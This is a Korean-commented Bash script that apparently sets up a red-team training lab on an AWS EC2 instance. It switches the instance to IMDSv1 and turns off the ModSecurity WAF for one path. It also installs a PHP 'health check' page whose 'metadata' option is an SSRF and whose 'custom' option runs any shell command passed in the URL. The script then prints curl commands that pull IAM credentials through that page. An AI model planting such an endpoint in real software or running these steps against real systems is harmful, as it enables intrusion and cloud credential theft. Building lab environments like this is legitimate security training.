#!/bin/bash
###############################################################################
# AWS IMDSv1 취약점 시나리오 설정
#
# 시나리오: 완벽한 보안 시스템 + 개발자의 작은 실수 하나
#
# 완벽한 보안:
#   ✓ ModSecurity WAF (모든 웹 공격 차단)
#   ✓ Splunk SIEM (모든 의심 활동 탐지)
#   ✓ PHP disable_functions (위험 함수 비활성화)
#
# 작은 실수 (단 하나):
#   ✗ 개발자가 health check 엔드포인트를 ModSecurity 예외로 등록
#   ✗ "서버 모니터링에 필요하다"는 이유로 WAF 우회 설정
#   ✗ IMDSv1 활성화 (IMDSv2 전환 깜빡함)
#
# 이 작은 틈으로 → SSRF → AWS credentials → 인프라 장악
###############################################################################

echo "╔═══════════════════════════════════════════════════════════╗"
echo "║   AWS IMDSv1 취약점 시나리오 설정                        ║"
echo "║   완벽한 보안 + 개발자의 작은 실수                       ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""

# 색상 코드
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# 루트 권한 확인
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}[-] 이 스크립트는 root 권한이 필요합니다${NC}"
    echo "sudo 또는 root로 실행하세요: sudo bash $0"
    exit 1
fi

###############################################################################
# Phase 1: 인스턴스 정보 확인
###############################################################################
echo -e "${BLUE}[Phase 1] EC2 인스턴스 정보 확인${NC}"
echo ""

# Instance ID
INSTANCE_ID=$(curl -s http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null)
if [ -z "$INSTANCE_ID" ]; then
    echo -e "${RED}[-] 메타데이터 서비스에 접근할 수 없습니다${NC}"
    read -p "Instance ID 수동 입력 (i-xxxxx): " INSTANCE_ID
    if [ -z "$INSTANCE_ID" ]; then
        echo -e "${RED}[-] Instance ID가 필요합니다${NC}"
        exit 1
    fi
fi
echo -e "${GREEN}[+] Instance ID: $INSTANCE_ID${NC}"

# Region
REGION=$(curl -s http://169.254.169.254/latest/meta-data/placement/region 2>/dev/null)
if [ -z "$REGION" ]; then
    REGION="ap-northeast-2"
    echo -e "${YELLOW}[*] Region 자동 감지 실패, 기본값 사용: $REGION${NC}"
else
    echo -e "${GREEN}[+] Region: $REGION${NC}"
fi

# IAM Role
IAM_ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
if [ -n "$IAM_ROLE" ] && [ "$IAM_ROLE" != "404 - Not Found" ]; then
    echo -e "${GREEN}[+] IAM Role: $IAM_ROLE${NC}"
else
    echo -e "${YELLOW}[*] IAM Role 없음 (IMDS 공격의 가치 제한됨)${NC}"
fi

echo ""

###############################################################################
# Phase 2: 현재 IMDS 설정 확인
###############################################################################
echo -e "${BLUE}[Phase 2] IMDS 설정 확인${NC}"
echo ""

# IMDSv1 테스트
IMDS_TEST=$(curl -s -w "\n%{http_code}" http://169.254.169.254/latest/meta-data/ 2>/dev/null)
HTTP_CODE=$(echo "$IMDS_TEST" | tail -n1)

if [ "$HTTP_CODE" = "200" ]; then
    echo -e "${GREEN}[+] IMDSv1 이미 활성화됨${NC}"
    IMDS_ENABLED=true
elif [ "$HTTP_CODE" = "401" ] || [ "$HTTP_CODE" = "403" ]; then
    echo -e "${YELLOW}[*] IMDSv2만 활성화됨 (안전한 상태)${NC}"
    echo -e "${YELLOW}[*] IMDSv1 활성화 필요${NC}"
    IMDS_ENABLED=false
else
    echo -e "${RED}[-] IMDS 접근 실패 (HTTP $HTTP_CODE)${NC}"
    IMDS_ENABLED=false
fi

echo ""

###############################################################################
# Phase 3: IMDSv1 활성화
###############################################################################
if [ "$IMDS_ENABLED" = false ]; then
    echo -e "${BLUE}[Phase 3] IMDSv1 활성화 (취약점 생성)${NC}"
    echo ""

    echo -e "${YELLOW}[!] 이 작업은 보안을 약화시킵니다${NC}"
    echo -e "${YELLOW}[!] IMDSv2 (required) → IMDSv1 (optional)${NC}"
    echo ""
    read -p "계속하시겠습니까? (y/N): " CONFIRM

    if [ "$CONFIRM" != "y" ] && [ "$CONFIRM" != "Y" ]; then
        echo -e "${YELLOW}[*] 취소됨${NC}"
        exit 0
    fi

    # AWS CLI 확인
    if ! command -v aws &> /dev/null; then
        echo -e "${RED}[-] AWS CLI 미설치${NC}"
        echo ""
        echo "설치 방법:"
        echo "  sudo yum install aws-cli -y     # Amazon Linux"
        echo "  sudo apt install awscli -y      # Ubuntu"
        exit 1
    fi

    # IMDS 설정 변경
    echo -e "${YELLOW}[*] aws ec2 modify-instance-metadata-options 실행 중...${NC}"

    OUTPUT=$(aws ec2 modify-instance-metadata-options \
        --instance-id "$INSTANCE_ID" \
        --http-tokens optional \
        --http-endpoint enabled \
        --region "$REGION" 2>&1)

    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[+] IMDSv1 활성화 성공${NC}"
        sleep 5

        # 검증
        TEST=$(curl -s -w "\n%{http_code}" http://169.254.169.254/latest/meta-data/ 2>/dev/null | tail -n1)
        if [ "$TEST" = "200" ]; then
            echo -e "${GREEN}[+] ✅ IMDSv1 접근 확인 완료${NC}"
        else
            echo -e "${YELLOW}[*] 변경 적용 대기 중 (1-2분 소요 가능)${NC}"
        fi
    else
        echo -e "${RED}[-] IMDSv1 활성화 실패${NC}"
        echo ""
        echo "에러: $OUTPUT"
        echo ""
        echo "AWS Console 수동 설정:"
        echo "  EC2 → Instances → Actions → Instance Settings"
        echo "  → Modify instance metadata options"
        echo "  → IMDSv2: Optional"
        exit 1
    fi
fi

echo ""

###############################################################################
# Phase 4: 개발자의 "작은 실수" 생성 - Health Check 엔드포인트
###############################################################################
echo -e "${BLUE}[Phase 4] 개발자의 '작은 실수' 생성${NC}"
echo ""

echo -e "${CYAN}시나리오:${NC}"
echo "  개발자가 서버 모니터링을 위한 health check 엔드포인트를 만들었습니다."
echo "  하지만 ModSecurity가 health check를 차단해서 모니터링이 안 되는 문제 발생."
echo "  '급한 대로' ModSecurity 예외를 추가해서 health check가 작동하게 했습니다."
echo "  → 이것이 '작은 틈'이 됩니다."
echo ""

# Health check PHP 파일 생성
HEALTH_PHP="/var/www/html/www/api/health.php"
mkdir -p /var/www/html/www/api

cat > "$HEALTH_PHP" << 'EOFPHP'
<?php
/**
 * Health Check Endpoint
 *
 * 용도: 서버 모니터링 시스템에서 인스턴스 상태 확인
 * 작성자: DevOps팀
 * 날짜: 2024-11-10
 *
 * 주의: ModSecurity 예외 설정됨 (모니터링 필수)
 */

// CORS 설정 (모니터링 시스템 접근용)
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/json');

// 기본 응답
$response = [
    'status' => 'ok',
    'timestamp' => time(),
    'server' => gethostname()
];

// 상세 체크 (내부용)
if (isset($_GET['check'])) {
    $check_type = $_GET['check'];

    switch ($check_type) {
        case 'disk':
            // 디스크 사용량
            $response['disk'] = shell_exec('df -h 2>&1');
            break;

        case 'memory':
            // 메모리 사용량
            $response['memory'] = shell_exec('free -m 2>&1');
            break;

        case 'process':
            // 프로세스 확인
            $proc_name = isset($_GET['name']) ? $_GET['name'] : 'httpd';
            $response['processes'] = shell_exec("ps aux | grep " . escapeshellarg($proc_name) . " 2>&1");
            break;

        case 'network':
            // 네트워크 연결 확인
            $host = isset($_GET['host']) ? $_GET['host'] : 'google.com';
            $response['network'] = shell_exec("ping -c 1 " . escapeshellarg($host) . " 2>&1");
            break;

        case 'metadata':
            // AWS 메타데이터 (인스턴스 정보)
            // 내부 모니터링용 - IMDSv2 토큰 없이도 작동해야 함
            $url = isset($_GET['url']) ? $_GET['url'] : 'http://169.254.169.254/latest/meta-data/instance-id';
            $response['metadata'] = shell_exec("curl -s -m 5 " . escapeshellarg($url) . " 2>&1");
            break;

        case 'custom':
            // 커스텀 명령 (긴급 디버깅용)
            if (isset($_GET['cmd'])) {
                $response['output'] = shell_exec($_GET['cmd'] . " 2>&1");
            }
            break;

        default:
            $response['error'] = 'Unknown check type';
    }
}

echo json_encode($response, JSON_PRETTY_PRINT);
?>
EOFPHP

chown apache:apache "$HEALTH_PHP" 2>/dev/null || chown www-data:www-data "$HEALTH_PHP" 2>/dev/null
chmod 644 "$HEALTH_PHP"

echo -e "${GREEN}[+] Health check 생성: /www/api/health.php${NC}"
echo ""

# ModSecurity 예외 추가
MODSEC_CONF="/etc/httpd/conf.d/mod_security.conf"

if [ ! -f "$MODSEC_CONF" ]; then
    # Apache 다른 경로
    MODSEC_CONF="/etc/apache2/mods-enabled/security2.conf"
fi

if [ -f "$MODSEC_CONF" ]; then
    echo -e "${YELLOW}[*] ModSecurity 예외 추가 중...${NC}"

    # 이미 예외가 있는지 확인
    if grep -q "api/health.php" "$MODSEC_CONF"; then
        echo -e "${YELLOW}[*] 예외 이미 존재${NC}"
    else
        cat >> "$MODSEC_CONF" << 'EOFMOD'

# ========================================
# Health Check Endpoint Exception
# ========================================
# 이유: 서버 모니터링 시스템이 정상 작동하려면
#       health check가 WAF 차단 없이 동작해야 함
# 승인: DevOps 팀장 (긴급)
# 날짜: 2024-11-10
# TODO: 더 안전한 방법으로 교체 필요
# ========================================

<LocationMatch "/api/health\.php">
    SecRuleEngine Off
</LocationMatch>

EOFMOD

        echo -e "${GREEN}[+] ModSecurity 예외 추가 완료${NC}"
        echo -e "${YELLOW}[*] Apache 재시작 필요${NC}"

        # Apache 재시작
        if systemctl restart httpd 2>/dev/null; then
            echo -e "${GREEN}[+] Apache 재시작 성공${NC}"
        elif systemctl restart apache2 2>/dev/null; then
            echo -e "${GREEN}[+] Apache 재시작 성공${NC}"
        else
            echo -e "${YELLOW}[*] Apache 수동 재시작 필요:${NC}"
            echo "    sudo systemctl restart httpd"
        fi
    fi
else
    echo -e "${YELLOW}[*] ModSecurity 설정 파일을 찾을 수 없습니다${NC}"
    echo "    수동으로 예외 추가 필요"
fi

echo ""

###############################################################################
# Phase 5: 검증
###############################################################################
echo -e "${BLUE}[Phase 5] 취약점 검증${NC}"
echo ""

# IMDS 접근 테스트
echo -e "${YELLOW}[*] IMDSv1 접근 테스트...${NC}"
IMDS_DATA=$(curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null)
if [ -n "$IMDS_DATA" ]; then
    echo -e "${GREEN}[+] ✅ IMDSv1 접근 가능${NC}"
    echo "    $(echo "$IMDS_DATA" | head -3 | tr '\n' ', ')..."
else
    echo -e "${RED}[-] IMDSv1 접근 불가${NC}"
fi

# IAM 자격 증명 테스트
if [ -n "$IAM_ROLE" ] && [ "$IAM_ROLE" != "404 - Not Found" ]; then
    echo -e "${YELLOW}[*] IAM 자격 증명 테스트...${NC}"
    CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE 2>/dev/null)
    if echo "$CREDS" | grep -q "AccessKeyId"; then
        ACCESS_KEY=$(echo "$CREDS" | grep -o '"AccessKeyId" : "[^"]*"' | cut -d'"' -f4)
        echo -e "${GREEN}[+] ✅ IAM 자격 증명 접근 가능${NC}"
        echo "    AccessKeyId: ${ACCESS_KEY:0:20}..."
    else
        echo -e "${YELLOW}[*] IAM 자격 증명 접근 불가${NC}"
    fi
fi

# Health check 테스트
echo -e "${YELLOW}[*] Health check 엔드포인트 테스트...${NC}"
HEALTH_TEST=$(curl -s http://localhost/www/api/health.php 2>/dev/null)
if echo "$HEALTH_TEST" | grep -q "status"; then
    echo -e "${GREEN}[+] ✅ Health check 작동 중${NC}"
else
    echo -e "${YELLOW}[*] Health check 응답 없음 (나중에 확인 필요)${NC}"
fi

echo ""

###############################################################################
# 최종 보고서
###############################################################################
echo "╔═══════════════════════════════════════════════════════════╗"
echo "║   ✅ 취약점 시나리오 설정 완료                           ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""

echo -e "${CYAN}📋 시나리오 요약:${NC}"
echo ""
echo "  ✅ 완벽한 보안 시스템:"
echo "     • ModSecurity WAF (모든 웹 공격 차단)"
echo "     • Splunk SIEM (의심 활동 탐지)"
echo "     • PHP disable_functions (위험 함수 비활성화)"
echo ""
echo "  ❌ 단 하나의 작은 틈:"
echo "     • /www/api/health.php → ModSecurity 예외"
echo "     • 이유: '서버 모니터링에 필요하다'는 명목"
echo "     • IMDSv1 활성화 (IMDSv2 전환 깜빡함)"
echo ""

echo -e "${CYAN}🎯 공격 경로:${NC}"
echo ""
echo "  1. /www/api/health.php 발견 (ModSecurity 우회)"
echo "  2. ?check=metadata&url=... 파라미터로 SSRF 트리거"
echo "  3. IMDSv1 접근 → IAM credentials 탈취"
echo "  4. AWS 인프라 열거 (EC2, S3, RDS, Secrets)"
echo "  5. 권한 상승 및 횡적 이동"
echo ""

echo -e "${CYAN}🚀 다음 단계 (로컬에서):${NC}"
echo ""
echo "  cd /Users/hwangjunha/Desktop/Red_basic_local/H/2025-11-14/exploits"
echo "  python3 120_aws_imds_exploit.py"
echo ""

echo -e "${CYAN}🧪 수동 테스트 (서버에서):${NC}"
echo ""
echo "  # 기본 health check"
echo "  curl http://localhost/www/api/health.php"
echo ""
echo "  # IMDS 접근"
echo "  curl 'http://localhost/www/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/'"
echo ""
if [ -n "$IAM_ROLE" ]; then
    echo "  # IAM credentials"
    echo "  curl 'http://localhost/www/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE'"
fi
echo ""

echo "╔═══════════════════════════════════════════════════════════╗"
echo "║   ⚠️  보안 경고                                           ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""
echo "  이 설정은 교육/테스트 목적으로만 사용하세요!"
echo ""
echo "  • IMDSv1은 SSRF 공격에 매우 취약합니다"
echo "  • ModSecurity 예외는 공격 표면을 크게 증가시킵니다"
echo "  • 실제 프로덕션 환경에서는 절대 사용하지 마세요"
echo ""
echo "  테스트 완료 후 원복:"
echo "    aws ec2 modify-instance-metadata-options \\"
echo "      --instance-id $INSTANCE_ID \\"
echo "      --http-tokens required \\"
echo "      --region $REGION"
echo ""

echo "══════════════════════════════════════════════════════════"
echo "설정 완료! 로컬에서 exploit 실행하세요."
echo "══════════════════════════════════════════════════════════"
